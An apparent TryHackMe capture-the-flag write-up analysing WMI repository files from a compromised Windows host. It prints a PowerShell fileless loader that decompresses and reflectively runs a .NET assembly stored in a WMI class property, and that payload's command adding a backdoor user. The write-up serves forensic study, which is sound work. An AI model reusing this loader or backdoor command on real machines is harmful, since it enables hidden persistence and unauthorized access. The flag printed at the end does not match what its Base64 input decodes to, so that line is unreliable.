---

Name: After Hours
Difficulty: Medium
URL: https://tryhackme.com/
Description: Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours, well after the night-shift technician has gone home.

---

## Extracting the Artifacts

We are given a ZIP archive containing several Windows system artifacts.

```bash
$ unzip attachments-1784136288483.zip

INDEX.BTR
MAPPING1.MAP
MAPPING2.MAP
MAPPING3.MAP
OBJECTS.DATA
```

Checking the file types doesn't reveal much.

```bash
$ file INDEX.BTR MAPPING*.MAP OBJECTS.DATA

INDEX.BTR:    data
MAPPING1.MAP: data
MAPPING2.MAP: data
MAPPING3.MAP: data
OBJECTS.DATA: data
```

Since these are binary Windows artifacts, we start by searching for readable strings.

```bash
strings -a OBJECTS.DATA | grep -Ei 'flag|payload|powershell|encoded|base64|invoke|download|http' | sort | uniq
```

## Finding the Malicious WMI Class

Among the output we find a suspicious command:

```text
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <base64>
```

Decoding the Base64 PowerShell payload reveals:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

The script accesses a WMI class named:

```text
Win32_HardwareTelemetry
```

and reads its:

```text
ConfigData
```

property.

Searching for the class in `OBJECTS.DATA` reveals the embedded data.

```bash
strings -a OBJECTS.DATA | grep -n -A5 -B5 'Win32_HardwareTelemetry'
```

```text
Win32_HardwareTelemetry
ConfigData
string
7VZPbFRFGP/edillgUrBAJWA...
```

The long Base64 string is the value of `ConfigData`.

## Extracting the Payload

The PowerShell tells us exactly how to process the data:

1. Base64 decode it.
2. Decompress it using Deflate.
3. Load the result as a .NET assembly.
4. Execute its entry point.

We extract the Base64 data and decode/decompress it with Python.

```bash
python3 - <<'PY'
import base64
import zlib

with open("telemetry.txt") as f:
    lines = [x.strip() for x in f if x.strip()]

data = next(x for x in lines if len(x) > 500)

compressed = base64.b64decode(data)
payload = zlib.decompress(compressed, -zlib.MAX_WBITS)

with open("payload.bin", "wb") as f:
    f.write(payload)

print(f"Payload size: {len(payload)} bytes")
PY
```

Checking the resulting file:

```bash
file payload.bin
```

```text
payload.bin: PE32 executable for MS Windows 4.00 (GUI), Intel i386 Mono/.Net assembly, 3 sections
```

The payload is a .NET assembly.

## Analyzing the .NET Assembly

We use `monodis` to inspect the assembly.

```bash
monodis --assembly payload.bin
```

```text
Assembly Table

Name: updates
Version: 0.0.0.0
```

Listing the methods shows the entry point.

```bash
monodis --method payload.bin
```

```text
Method Table (1..2)

########## AfterHours.Program
1: default void Main ()  (param: 1 impl_flags: cil managed )
2: instance default void '.ctor' ()  (param: 1 impl_flags: cil managed )
```

Dumping the assembly to IL:

```bash
monodis payload.bin > payload.il
```

The `Main()` method first checks the machine name:

```text
IL_0000: call string class [mscorlib]System.Environment::get_MachineName()
IL_0005: ldstr "bytelotusdc"
IL_000a: ldc.i4.5
IL_000b: call bool string::Equals(...)
```

So the payload expects the machine to be named:

```text
bytelotusdc
```

If the environment matches, it executes:

```text
/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
```

The payload therefore attempts to create a new Windows user named:

```text
patch
```

with the supplied password.

## Recovering the Flag

The password is Base64 encoded:

```text
VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9
```

Decode it:

```bash
echo 'VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9' | base64 -d
```

```text
THM{A4tch_op3n3d_tH3_BacKd00r}
```


